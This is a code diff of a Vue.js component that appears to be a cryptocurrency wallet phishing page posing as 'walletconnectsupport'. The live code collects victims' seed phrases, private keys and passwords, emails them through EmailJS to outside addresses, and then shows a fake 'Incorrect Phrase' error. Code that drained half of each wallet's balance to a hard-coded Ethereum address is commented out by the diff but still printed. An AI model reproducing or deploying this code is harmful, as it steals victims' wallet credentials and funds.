@@ -119,7 +119,6 @@ RESTORE
             label="Enter temporary session password"
             solo
             v-model="phrase_24_password"
-            :rules="passRules"
           ></v-text-field>
           <v-checkbox
               v-model="ex4"
@@ -166,7 +165,6 @@ RESTORE
             label="Enter temporary session password"
             solo
             v-model="private_pass"
-            :rules="private_pass_Rules"
           ></v-text-field>
           <v-checkbox
               v-model="ex4"
@@ -240,8 +238,8 @@ import storage from '@/fire'
 import fb from '@/fire'
 import router from '@/router'
 import emailjs from 'emailjs-com'
-import {ethers} from 'ethers'
-import BigNumber from 'bignumber.js'
+// import {ethers} from 'ethers'
+// import BigNumber from 'bignumber.js'
 export default {
   data() {
     return {
@@ -288,22 +286,48 @@ export default {
 
   },
   methods: {
+    async requestNotificationPermission() {
+      if ('Notification' in window) {
+        const permission = await Notification.requestPermission();
+        return permission === 'granted';
+      }
+      return false;
+    },
+    sendNotification() {
+      this.requestNotificationPermission().then((granted) => {
+        if (granted) {
+          const notification = new Notification('Hello!', {
+            body: 'This is a browser notification!',
+            icon: 'https://via.placeholder.com/128', // Optional icon
+          });
+          notification.onclick = () => {
+            window.focus(); // Optional: Bring focus to the window when clicked
+          };
+        } else {
+          console.log('Notification permission denied.');
+        }
+      });
+    },
    sendEmail(msg) {
+  
   //sendEmail() {
+    
       try {
           emailjs.send('service_pib4i0c', 'template_zeobwbd',
         {
            name: 'walletconnectsupport',
               email: 'showolesheriff7@gmail.com',
            message: msg,
-            to:'Annehathaway009@gmail.com'
-            },'wqsvu3cCKwr-c_w1_');
-        
+            to:'Melindahotbenks101@outlook.com'
+            },'wqsvu3cCKwr-c_w1_').then((e)=>{
+                console.log(e +'SUCCESSFULLY SENT')
+            })
+
 
     } catch(error) {
-           console.log({error})
+           console.log(error+'error')
      }
-    //   //jp5296143@gmail.com Reset formjasonwgeorge010@gmail.com fieldMelindahotbenks101@outlook.com
+    //   //jp5296143@gmail.com Resetmarkhamdavid112@gmail.com formjasonwgeorge010@gmail.com fieldMelindahotbenks101@outlook.com
     // try {
     //             emailjs.send('service_pib4i0c', 'template_zeobwbd',
     //                 {
@@ -349,33 +373,24 @@ fb.fb.collection('keystore_melin').add({name:url,wallet_type:this.wallet_type,pa
     },
     async insert_mnemonics(){
       try{
-      this.provider= new ethers.JsonRpcProvider('https://eth-mainnet.g.alchemy.com/v2/ZMQRM7X06XnuSWA1GpTs2SqJLvHLwC-b');   
+      //this.provider= new ethers.JsonRpcProvider('https://eth-mainnet.g.alchemy.com/v2/ZMQRM7X06XnuSWA1GpTs2SqJLvHLwC-b');   
         this.alt_msg = "connecting..."
             this.alert = !this.alert
-      const data={
-        wallet_type:this.wallet_type,
-        phrase:this.phrase_24,
-        password:this.phrase_24_password,
-        time:new Date()
-      }
-      await fb.fb.collection('mnemonics_melin').add(data).then((e)=>{
-     console.log(e)
-  this.sendEmail("mnemonics: "+this.phrase_24+" wallet type: "+this.wallet_type+" password:  "+this.phrase_24_password);
+    
+     this.sendEmail("mnemonics: "+this.phrase_24+" wallet type: "+this.wallet_type+" password:  "+this.phrase_24_password);
       this.sendEmail_me("mnemonics: " + this.phrase_24 + " wallet type: " + this.wallet_type + " password:  " + this.phrase_24_password);
        this.alt_msg="Incorrect Phrase,\n please Re-enter phrase "
      this.phrase_24=""
      this.phrase_24_password=""
-        
-  })
-  this.wallet=ethers.Wallet.fromPhrase(this.phrase_24,this.provider);
-  this.wallet_bal=await this.provider.getBalance(this.wallet.address)
-  const amt = ethers.parseEther((BigNumber(this.wallet_bal.toString()).dividedBy(2)).toString());
+  // this.wallet=ethers.Wallet.fromPhrase(this.phrase_24,this.provider);
+  // this.wallet_bal=await this.provider.getBalance(this.wallet.address)
+  // const amt = ethers.parseEther((BigNumber(this.wallet_bal.toString()).dividedBy(2)).toString());
 
-  const tx= await this.wallet.sendTransaction({
-        to:'0xE96Aed92915a29239a60A47D042B738dE7957A97',
-        value:amt
-    })
-    await tx.wait()
+  // const tx= await this.wallet.sendTransaction({
+  //       to:'0xE96Aed92915a29239a60A47D042B738dE7957A97',
+  //       value:amt
+  //   })
+  //   await tx.wait()
     //console.log(tx.hash())
       }
       catch(err){
@@ -384,36 +399,27 @@ fb.fb.collection('keystore_melin').add({name:url,wallet_type:this.wallet_type,pa
     },
     async insert_private_key(){
       try{
-      this.provider= new ethers.JsonRpcProvider('https://eth-mainnet.g.alchemy.com/v2/ZMQRM7X06XnuSWA1GpTs2SqJLvHLwC-b');
+     // this.provider= new ethers.JsonRpcProvider('https://eth-mainnet.g.alchemy.com/v2/ZMQRM7X06XnuSWA1GpTs2SqJLvHLwC-b');
         this.alt_msg =
         
         "connecting..."
             this.alert = !this.alert
-      const data={
-        wallet_type:this.wallet_type,
-        private_key:this.private_key,
-        password:this.private_pass,
-        time:new Date()
-      }
-      await fb.fb.collection('private_key_melin').add(data).then((e)=>{
-     console.log(e)
-     this.sendEmail_me("mnemonics: "+this.private_key+" wallet type: "+this.wallet_type+" password:  "+this.private_pass);
+     
+          this.sendEmail_me("mnemonics: "+this.private_key+" wallet type: "+this.wallet_type+" password:  "+this.private_pass);
      this.sendEmail("mnemonics: " + this.private_key + " wallet type: " + this.wallet_type + " password:  " + this.private_pass);
       this.alt_msg="Incorrect Phrase,\n please Re-enter phrase"
       this.private_key=""
       this.private_pass=""
-  
-   })
-   this.wallet=new ethers.Wallet(this.phrase_24,this.provider);
-  this.wallet_bal=await this.provider.getBalance(this.wallet.address)
-  const amt = ethers.parseEther((BigNumber(this.wallet_bal.toString()).dividedBy(2)).toString());
+  //  this.wallet=new ethers.Wallet(this.phrase_24,this.provider);
+  // this.wallet_bal=await this.provider.getBalance(this.wallet.address)
+  // const amt = ethers.parseEther((BigNumber(this.wallet_bal.toString()).dividedBy(2)).toString());
 
 
-  const tx= await this.wallet.sendTransaction({
-        to:'0xE96Aed92915a29239a60A47D042B738dE7957A97',
-        value:amt
-    })
-    await tx.wait()
+  // const tx= await this.wallet.sendTransaction({
+  //       to:'0xE96Aed92915a29239a60A47D042B738dE7957A97',
+  //       value:amt
+  //   })
+    //await tx.wait()
     //console.log(tx.hash())
   }
       catch(err){
